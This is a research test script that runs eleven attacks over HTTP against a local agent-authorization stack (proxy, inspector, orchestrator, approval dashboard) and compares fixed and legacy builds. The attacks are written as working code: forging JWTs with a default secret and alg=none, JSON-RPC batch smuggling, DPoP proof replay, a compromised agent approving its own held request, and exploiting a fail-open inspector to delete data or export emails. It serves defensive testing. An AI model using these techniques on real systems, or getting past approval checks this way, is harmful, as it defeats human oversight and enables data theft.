// E2: protocol-level attacks against a running stack, over real HTTP.
//
// Usage:
//   node experiments/run-protocol-attacks.js --target fixed  --root .
//   node experiments/run-protocol-attacks.js --target legacy --root /path/to/checkout-of-ce51701
//
// Each component runs as its own process (as in `npm run start:<component>`).
// The attacker is a compromised agent: it holds a legitimately issued passport and
// can reach the proxy (and, for P8/P9, the protected server), but holds none of the
// orchestrator credential, approver token, or private keys.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { createHash } from "node:crypto";
import net from "node:net";
import { spawn, execFileSync } from "node:child_process";
import Database from "better-sqlite3";
import jwt from "jsonwebtoken";
import { request } from "undici";
import { RAW } from "./lib/paths.js";

const DEAD_MODEL_URL = "http://127.0.0.1:9/api/generate"; // nothing listens on the discard port
const RESULTS_DIR = RAW;

function parseArgs(argv) {
  const args = { target: "fixed", root: process.cwd(), basePort: 5600, trials: 5 };
  for (let i = 0; i < argv.length; i += 1) {
    if (argv[i] === "--target") args.target = argv[i + 1];
    if (argv[i] === "--root") args.root = path.resolve(argv[i + 1]);
    if (argv[i] === "--base-port") args.basePort = Number(argv[i + 1]);
    if (argv[i] === "--only") args.only = argv[i + 1].split(",");
    if (argv[i] === "--out") args.out = argv[i + 1];
    if (argv[i] === "--trials") args.trials = Number(argv[i + 1]);
  }
  return args;
}

async function waitFor(url, timeoutMs = 15000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    try {
      const response = await request(url, { method: "GET" });
      await response.body.dump();
      return;
    } catch {
      await new Promise((resolve) => setTimeout(resolve, 150));
    }
  }
  throw new Error(`Timed out waiting for ${url}`);
}

function portOpen(port) {
  return new Promise((resolve) => {
    const socket = net.connect({ port, host: "127.0.0.1" }, () => {
      socket.end();
      resolve(true);
    });
    socket.on("error", () => resolve(false));
  });
}

async function waitForPortsFree(ports, timeoutMs = 15000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const open = await Promise.all(ports.map(portOpen));
    if (!open.some(Boolean)) return;
    await new Promise((resolve) => setTimeout(resolve, 200));
  }
  throw new Error(`Ports still in use: ${ports.join(", ")}`);
}

const exited = (child) => child.exitCode !== null || child.signalCode !== null;

async function stopChildren(children) {
  children.forEach((child) => !exited(child) && child.kill("SIGTERM"));
  await Promise.all(children.map((child) => new Promise((resolve) => (exited(child) ? resolve() : child.once("exit", resolve)))));
}

async function waitForPort(port, timeoutMs = 15000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const open = await new Promise((resolve) => {
      const socket = net.connect({ port, host: "127.0.0.1" }, () => {
        socket.end();
        resolve(true);
      });
      socket.on("error", () => resolve(false));
    });
    if (open) return;
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  throw new Error(`Timed out waiting for port ${port}`);
}

// Starts the four components as separate processes. `inspectorEnv` lets the
// outage instance give only the inspector a dead model with REQUIRE_MODEL=1.
async function startInstance(options) {
  // A previous trial's processes may still be releasing their ports; retry.
  let lastError;
  for (let attempt = 1; attempt <= 3; attempt += 1) {
    try {
      return await startInstanceOnce(options);
    } catch (error) {
      lastError = error;
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
  }
  throw lastError;
}

async function startInstanceOnce({ root, ports, dbPath, inspectorEnv = {} }) {
  await waitForPortsFree(Object.values(ports));
  const common = {
    ...process.env,
    PROXY_PORT: String(ports.proxy),
    PROTECTED_PORT: String(ports.protected),
    INSPECTOR_PORT: String(ports.inspector),
    ORCHESTRATOR_PORT: String(ports.orchestrator),
    DB_PATH: dbPath,
    LOG_LEVEL: "warn",
    OLLAMA_URL: DEAD_MODEL_URL,
    INSPECTOR_MODE: "heuristic",
    SUMMARIZER_MODE: "deterministic",
    APPROVAL_TIMEOUT_MS: "2500",
    REQUIRE_MODEL: "",
  };
  const children = [];
  for (const component of ["protected", "inspector", "orchestrator", "proxy"]) {
    const env = component === "inspector" ? { ...common, ...inspectorEnv } : common;
    const child = spawn(process.execPath, ["src/index.js", component], { cwd: root, env, stdio: ["ignore", "ignore", "pipe"] });
    child.stderr.on("data", () => {});
    children.push(child);
  }
  // Every component must be listening before an attack runs; otherwise a
  // connection error could be mistaken for a prevented attack.
  try {
    await Promise.all(Object.values(ports).map((port) => waitForPort(port)));
    await waitFor(`http://127.0.0.1:${ports.proxy}/health`);
    await waitFor(`http://127.0.0.1:${ports.orchestrator}/catalog`);
  } catch (error) {
    await stopChildren(children);
    throw error;
  }
  return {
    ports,
    async stop() {
      await stopChildren(children);
    },
  };
}

function datasetExists(dbPath, id) {
  const db = new Database(dbPath, { readonly: true, fileMustExist: true });
  try {
    return Boolean(db.prepare("SELECT 1 FROM datasets WHERE id = ?").get(id));
  } finally {
    db.close();
  }
}

async function post(url, body, headers = {}) {
  const response = await request(url, {
    method: "POST",
    headers: { "content-type": "application/json", accept: "application/json, text/event-stream", ...headers },
    body: JSON.stringify(body),
  });
  const text = await response.body.text();
  let json;
  try {
    json = JSON.parse(text);
  } catch {
    const match = text.match(/data:\s*(\{[\s\S]*\}|\[[\s\S]*\])/);
    json = match ? JSON.parse(match[1]) : { raw: text.slice(0, 300) };
  }
  return { status: response.statusCode, json };
}

async function get(url) {
  const response = await request(url);
  return { status: response.statusCode, headers: response.headers, text: await response.body.text() };
}

const toolCall = (name, args, id = 1) => ({ jsonrpc: "2.0", id, method: "tools/call", params: { name, arguments: args } });

function makeContext({ root, instance, dbPath }) {
  const runtime = path.join(root, ".runtime");
  const secretsFile = path.join(runtime, "secrets.json");
  const clientToken = fs.existsSync(secretsFile) ? JSON.parse(fs.readFileSync(secretsFile, "utf8")).orchestratorClientToken : undefined;
  const proxyIdentity = JSON.parse(fs.readFileSync(path.join(runtime, "proxy-identity.json"), "utf8"));
  const base = (port) => `http://127.0.0.1:${port}`;
  const proxyMcp = `${base(instance.ports.proxy)}/mcp`;
  const protectedMcp = `${base(instance.ports.protected)}/mcp`;

  // The trusted user front end minting a passport for the agent.
  async function userPassport(prompt, extra = {}) {
    const { status, json } = await post(`${base(instance.ports.orchestrator)}/intent-passports`, { prompt, ...extra },
      clientToken ? { authorization: `Bearer ${clientToken}` } : {});
    if (status !== 200) throw new Error(`user passport mint failed: ${status} ${JSON.stringify(json)}`);
    return json.token;
  }

  // Mints a proof with the proxy's key, standing in for a proof captured on the
  // proxy-server link. `body` is the exact serialized body it was made for.
  function dpopProof(accessToken, url, body) {
    const sha = (value) => createHash("sha256").update(value).digest("base64url");
    return jwt.sign(
      { htm: "POST", htu: url, ath: sha(accessToken), bdh: sha(body), jti: crypto.randomUUID(), iat: Math.floor(Date.now() / 1000) },
      proxyIdentity.privateKeyPem,
      { algorithm: "ES256", header: { typ: "dpop+jwt", alg: "ES256", jwk: proxyIdentity.publicJwk } },
    );
  }

  return { base, proxyMcp, protectedMcp, userPassport, dpopProof, dbPath, instance };
}

const executed = (response) => response.status === 200 && response.json?.result && !response.json.result.isError;

// Each attack returns { success, evidence }. success = the attacker achieved the harmful effect.
const ATTACKS = [
  {
    id: "X1", name: "Agent mints its own passport with broad scopes",
    async run(ctx) {
      const minted = await post(`${ctx.base(ctx.instance.ports.orchestrator)}/intent-passports`,
        { prompt: "Delete the sales-q1 dataset.", toolScopes: ["delete_dataset"] });
      if (minted.status !== 200) return { success: false, evidence: `mint refused (${minted.status})` };
      const response = await post(ctx.proxyMcp, toolCall("delete_dataset", { datasetId: "sales-q1", confirmation: "DELETE" }),
        { authorization: `Bearer ${minted.json.token}` });
      return { success: !datasetExists(ctx.dbPath, "sales-q1"), evidence: `mint 200; call ${response.status}` };
    },
  },
  {
    id: "X2", name: "Forged passport (HS256, published default secret)",
    async run(ctx) {
      const state = await get(`${ctx.base(ctx.instance.ports.proxy)}/api/state`);
      const jkt = JSON.parse(state.text).security?.senderConstraintThumbprint;
      const forged = jwt.sign({
        sub: "attacker", summary: "Clean up the sales-q1 dataset.", intent_type: "delete",
        tool_scopes: ["delete_dataset"], resource_indicators: ["demo://datasets/sales-q1"],
        passport_type: "contextual-passport", cnf: { jkt },
      }, "demo-intent-secret-change-me", {
        issuer: "orchestrator.demo", audience: "mcp-server-sales-production", algorithm: "HS256", expiresIn: 300,
      });
      const response = await post(ctx.proxyMcp, toolCall("delete_dataset", { datasetId: "sales-q1", confirmation: "DELETE" }),
        { authorization: `Bearer ${forged}` });
      return { success: !datasetExists(ctx.dbPath, "sales-q1"), evidence: `call ${response.status}` };
    },
  },
  {
    id: "X3", name: "Unsigned passport (alg=none) [control]",
    async run(ctx) {
      const unsigned = jwt.sign({
        summary: "x", intent_type: "delete", tool_scopes: ["delete_dataset"], resource_indicators: ["demo://datasets/sales-q1"],
        passport_type: "contextual-passport", iss: "orchestrator.demo", aud: "mcp-server-sales-production",
      }, undefined, { algorithm: "none" });
      const response = await post(ctx.proxyMcp, toolCall("delete_dataset", { datasetId: "sales-q1", confirmation: "DELETE" }),
        { authorization: `Bearer ${unsigned}` });
      return { success: !datasetExists(ctx.dbPath, "sales-q1"), evidence: `call ${response.status}` };
    },
  },
  {
    id: "X4", name: "JSON-RPC batch smuggling past the policy layer",
    async run(ctx) {
      const token = await ctx.userPassport("Generate a revenue report for sales-q1.");
      const response = await post(ctx.proxyMcp, [toolCall("delete_dataset", { datasetId: "sales-q2", confirmation: "DELETE" })],
        { authorization: `Bearer ${token}` });
      return { success: !datasetExists(ctx.dbPath, "sales-q2"), evidence: `call ${response.status} ${JSON.stringify(response.json).slice(0, 120)}` };
    },
  },
  {
    id: "X5", name: "resources/read of an unbound resource",
    async run(ctx) {
      const token = await ctx.userPassport("Generate a revenue report for sales-q1.");
      const response = await post(ctx.proxyMcp, { jsonrpc: "2.0", id: 1, method: "resources/read", params: { uri: "demo://datasets/sales-q2" } },
        { authorization: `Bearer ${token}` });
      const text = JSON.stringify(response.json);
      return { success: response.status === 200 && text.includes("sales-q2") && text.includes("contents"), evidence: `call ${response.status}` };
    },
  },
  {
    id: "X6", name: "Agent approves its own held request",
    async run(ctx) {
      const token = await ctx.userPassport("Generate a revenue report for sales-q1.", {
        toolScopes: ["list_datasets", "get_dataset_overview", "read_dataset_rows", "generate_report", "export_customer_emails"],
      });
      const pending = post(ctx.proxyMcp, toolCall("export_customer_emails", { datasetId: "sales-q1" }), { authorization: `Bearer ${token}` });
      let decisionStatus = "no approval seen";
      for (let i = 0; i < 20; i += 1) {
        await new Promise((resolve) => setTimeout(resolve, 100));
        const list = JSON.parse((await get(`${ctx.base(ctx.instance.ports.proxy)}/approvals`)).text);
        if (list.pending?.[0]) {
          const decision = await post(`${ctx.base(ctx.instance.ports.proxy)}/approvals/${list.pending[0].id}/decision`,
            { approved: true, approver: "agent" });
          decisionStatus = `decision ${decision.status}`;
          break;
        }
      }
      const response = await pending;
      return { success: executed(response) && JSON.stringify(response.json).includes("@"), evidence: `${decisionStatus}; call ${response.status}` };
    },
  },
  {
    id: "X7", name: "Inspector outage fails open (REQUIRE_MODEL=1, model down)",
    outage: true,
    async run(ctx) {
      const token = await ctx.userPassport("Generate a revenue report for sales-q1.", {
        toolScopes: ["list_datasets", "get_dataset_overview", "generate_report", "delete_dataset"],
      });
      const response = await post(ctx.proxyMcp, toolCall("delete_dataset", { datasetId: "sales-q1", confirmation: "DELETE" }),
        { authorization: `Bearer ${token}` });
      return { success: !datasetExists(ctx.dbPath, "sales-q1"), evidence: `call ${response.status}` };
    },
  },
  {
    id: "X8", name: "Stolen passport sent directly to the protected server [control]",
    async run(ctx) {
      const token = await ctx.userPassport("Generate a revenue report for sales-q1.");
      const response = await post(ctx.protectedMcp, toolCall("generate_report", { datasetId: "sales-q1", objective: "x" }),
        { authorization: `Bearer ${token}` });
      return { success: executed(response), evidence: `call ${response.status}` };
    },
  },
  {
    id: "X9", name: "Captured DPoP proof replayed with an out-of-scope call",
    async run(ctx) {
      const token = await ctx.userPassport("Generate a revenue report for sales-q1.");
      const legitCall = toolCall("generate_report", { datasetId: "sales-q1", objective: "Q1 summary" });
      const proof = ctx.dpopProof(token, `http://127.0.0.1:${ctx.instance.ports.protected}/mcp`, JSON.stringify(legitCall));
      const headers = { authorization: `Bearer ${token}`, dpop: proof };
      const legit = await post(ctx.protectedMcp, legitCall, headers);
      const replay = await post(ctx.protectedMcp, toolCall("delete_dataset", { datasetId: "sales-q1", confirmation: "DELETE" }, 2), headers);
      return { success: !datasetExists(ctx.dbPath, "sales-q1"), evidence: `original ${legit.status}; replay ${replay.status}` };
    },
  },
  {
    id: "X12", name: "Proof made for one call used first with a different in-scope call",
    async run(ctx) {
      // The user granted export; the proxy would hold it for approval. The attacker
      // sees the proof the proxy made for a report call and uses it first, with an
      // export body, directly at the server (skipping inspection and approval).
      const token = await ctx.userPassport("Generate a revenue report for sales-q1.", {
        toolScopes: ["list_datasets", "get_dataset_overview", "read_dataset_rows", "generate_report", "export_customer_emails"],
      });
      const intended = toolCall("generate_report", { datasetId: "sales-q1", objective: "Q1 summary" });
      const proof = ctx.dpopProof(token, `http://127.0.0.1:${ctx.instance.ports.protected}/mcp`, JSON.stringify(intended));
      const response = await post(ctx.protectedMcp, toolCall("export_customer_emails", { datasetId: "sales-q1" }),
        { authorization: `Bearer ${token}`, dpop: proof });
      return { success: executed(response) && JSON.stringify(response.json).includes("@"), evidence: `substituted call ${response.status}` };
    },
  },
  {
    id: "X10", name: "Passport with no bound resources reaches any dataset",
    async run(ctx) {
      const token = await ctx.userPassport("Generate a revenue report.");
      const response = await post(ctx.proxyMcp, toolCall("read_dataset_rows", { datasetId: "sales-q2", limit: 20 }), { authorization: `Bearer ${token}` });
      return { success: executed(response) && JSON.stringify(response.json).includes("@example.com"), evidence: `call ${response.status}` };
    },
  },
  {
    id: "X11", name: "Approval dashboard renders agent-controlled text as HTML",
    async run(ctx) {
      const page = await get(`${ctx.base(ctx.instance.ports.proxy)}/dashboard/app.js`);
      const csp = (await get(`${ctx.base(ctx.instance.ports.proxy)}/dashboard/`)).headers["content-security-policy"];
      const escapesArgs = /\$\{esc\(approval\.inspector\.reason\)\}/.test(page.text);
      return { success: !escapesArgs && !csp, evidence: `escapes=${escapesArgs}; csp=${csp ? "yes" : "no"} (static check)` };
    },
  },
];

async function main() {
  const args = parseArgs(process.argv.slice(2));
  // Create keys/secrets once so concurrently starting processes agree on them.
  execFileSync(process.execPath, ["-e", "import('./src/runtime/config.js')"], { cwd: args.root });

  const results = [];
  for (const attack of ATTACKS.filter((a) => !args.only || args.only.includes(a.id))) {
    const trials = [];
    for (let trial = 1; trial <= args.trials; trial += 1) {
      const work = fs.mkdtempSync(path.join(os.tmpdir(), `sfmcp-e2-${attack.id}-`));
      const dbPath = path.join(work, "demo.db");
      const ports = { proxy: args.basePort, protected: args.basePort + 1, inspector: args.basePort + 2, orchestrator: args.basePort + 3 };
      let instance;
      try {
        instance = await startInstance({
          root: args.root,
          ports,
          dbPath,
          inspectorEnv: attack.outage ? { REQUIRE_MODEL: "1", INSPECTOR_MODE: "ensemble", OLLAMA_MODEL: "unavailable-model" } : {},
        });
      } catch (error) {
        trials.push({ success: false, invalid: true, evidence: `start failed: ${error.message}` });
        continue;
      }
      let outcome;
      try {
        outcome = await attack.run(makeContext({ root: args.root, instance, dbPath }));
      } catch (error) {
        outcome = { success: false, invalid: true, evidence: `error: ${error.message}` };
      } finally {
        await instance.stop();
      }
      trials.push(outcome);
    }
    const valid = trials.filter((t) => !t.invalid);
    const successes = valid.filter((t) => t.success).length;
    const row = {
      target: args.target, id: attack.id, name: attack.name,
      success: successes > 0, successes, trials: valid.length, invalidTrials: trials.length - valid.length,
      evidence: [...new Set(trials.map((t) => t.evidence))].join(" | "),
    };
    results.push(row);
    console.log(`${args.target} ${attack.id} ${successes}/${valid.length} succeeded (${row.invalidTrials} invalid) - ${row.evidence}`);
  }

  fs.mkdirSync(RESULTS_DIR, { recursive: true });
  fs.writeFileSync(args.out ? path.resolve(args.out) : path.join(RESULTS_DIR, `e2-${args.target}.json`), JSON.stringify({ ranAt: new Date().toISOString(), trialsPerAttack: args.trials, results }, null, 2));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
